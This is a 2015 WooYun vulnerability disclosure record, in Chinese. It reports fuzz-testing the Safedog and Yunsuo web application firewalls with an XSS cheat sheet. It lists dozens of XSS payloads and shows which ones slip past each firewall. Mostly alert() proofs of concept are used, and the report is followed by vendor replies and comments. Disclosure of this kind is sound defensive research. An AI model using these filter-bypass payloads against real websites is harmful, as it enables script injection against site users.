{"id": 45003, "wybug_id": "wooyun-2015-089591", "wybug_title": "国内WAF的Fuzz测试之xss篇(安全狗、云锁为例)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "HackBraid", "wybug_date": "2015-01-04 15:30", "wybug_open_date": "2015-04-04 15:32", "wybug_type": "非授权访问/认证绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向公众公开  简要描述： 用安全狗和云锁为例进行测试发现不少问题来个闪电可好~ 详细说明：  通过cheat sheet的可以批量对WAF进行测试，这里测试WAF的XSS防护能力，发现很严重的问题。0x00 测试环境wamp+74cms，参照 WooYun: 实战绕过云锁(1.3.145)进行注入测试绕过技巧 里配置，在url输入xss语句后，会被带入数据库端查询，所以会经过安全狗、云锁等WAF的检查。0x01 XSS payload\n<img src=x onerror=alert(1)><img/src=x onerror=alert(1)><img src=x onerror=alert(1)> <img src=x onerror=window.open('http://google.com');><img/src/onerror=alert(1)><img src=\"x:kcf\" onerror=\"alert(1)\"><a href=javascript:alert(2)>M <a href=j&#x61;v&#97script&#x3A;&#97lert(13)>M<a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E>M <script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script><script firefox>alert(1)</script><script>~'\\u0061' ;  \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073.  \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script> // <script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script><script>prompt(-[])</script><script>alert(/3/)</script><script>alert(String.fromCharCode(49))</script><script>alert(/7/.source)</script><script>setTimeout('alert(1)',0)</script> <form><button formaction=javascript&colon;alert(1)>M<button onfocus=alert(1) autofocus><button/onclick=alert(1) >M</button><p/onmouseover=javascript:alert(1); >M</p><var onmouseover=\"prompt(1)\">KCF</var><div/onmouseover='alert(1)'>X <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object><select onfocus=javascript:alert(1) autofocus><textarea onfocus=javascript:alert(1) autofocus><svg onload=\"javascript:alert(1)\" xmlns=\"http://www.w3.org/2000/svg\"></svg> <math href=\"javascript:javascript:alert(1)\">CLICKME</math> <video><source onerror=\"alert(1)\"> <audio src=x onerror=alert(47)>\n0x02 安全狗XSS测试结果：1.<img src=x onerror=alert(1)> 被安全狗拦截\n\n2.<img/src=x onerror=alert(1)> 绕过了\n\n3.<a>标签没有防护<a href=javascript:alert(2)>\n\n4.<script>标签都被拦截<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>\n\n5.select、textarea、svg、button、math、video等标签都没防护<select onfocus=javascript:alert(1) autofocus>\n\n<textarea onfocus=javascript:alert(1) autofocus>\n\n<svg onload=\"javascript:alert(1)\" xmlns=\"http://www.w3.org/2000/svg\"></svg> \n\n<math href=\"javascript:javascript:alert(1)\">CLICKME</math> \n\n<video><source onerror=\"alert(1)\"> \n\n<audio src=x onerror=alert(47)></code>\n\n<button onfocus=alert(1) autofocus>\n\n0x03 云锁测试结果1.<img src=x onerror=alert(1)> 拦截\n\n2.<img/src=x onerror=alert(1)> 绕过\n\n3.<a>标签没有防护<a href=javascript:alert(2)>\n\n4.<script>标签被拦截<script>alert(String.fromCharCode(49))</script>\n\n5.select、textarea、svg、button、math、video等标签同样都没防护<select onfocus=javascript:alert(1) autofocus>\n\n<textarea onfocus=javascript:alert(1) autofocus>\n\n<svg onload=\"javascript:alert(1)\" xmlns=\"http://www.w3.org/2000/svg\"></svg> \n\n<math href=\"javascript:javascript:alert(1)\">CLICKME</math> \n\n<video><source onerror=\"alert(1)\"> \n\n<audio src=x onerror=alert(47)></code>\n\n<button onfocus=alert(1) autofocus>\n\n0x04 总结安全狗、云锁在XSS防护方面只针对<script>标签做了防护，<img>可简单绕过，而像a、select、textarea、svg、button、math、video等标签是没有任何防护能力的。   漏洞证明：  见详细   修复方案：  增加防护规则   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-01-09 13:39 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-04 15:59 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  这种思路好像没人用过，可惜没有雷劈~    \n     2015-01-04 17:10 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @HackBraid 超音速发包？然后看返回？    \n     2015-01-04 17:14 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @debbbbie 光速、要注重效率    \n     2015-01-04 17:33 |    \t\tdebbbbie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 深藏功与名 - A Rubyist)\t\t \n  @HackBraid 真的不会把网站发死了嘛。    \n     2015-01-09 15:54 |    \t\t劳资就是美国佬 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 劳资就是美国佬)\t\t \n  乌云SHELL上传http://www.wooyun.org/editor/image.php?uploadedId=    \n     2015-01-21 11:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这些payload什么的很常见了。管理员觉得也没什么特别的所以就不给雷了    \n     2015-04-04 21:28 |    \t\tbitcoin \t\t\t( 普通白帽子  |\t\t\t        Rank:715 漏洞数:218        | 学习是最好的投资！)\t\t \n  这个好多钱呢？    \n     2015-04-15 12:36 |    \t\tWatermelon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:9        | Watermelon)\t\t \n  看下某安全宝 2011年漏洞 被忽略的去看看    \n     2015-04-15 13:19 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @Watermelon 名字都要起的高大上点，其实内容就那样。只是那会儿有点时间看了看    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}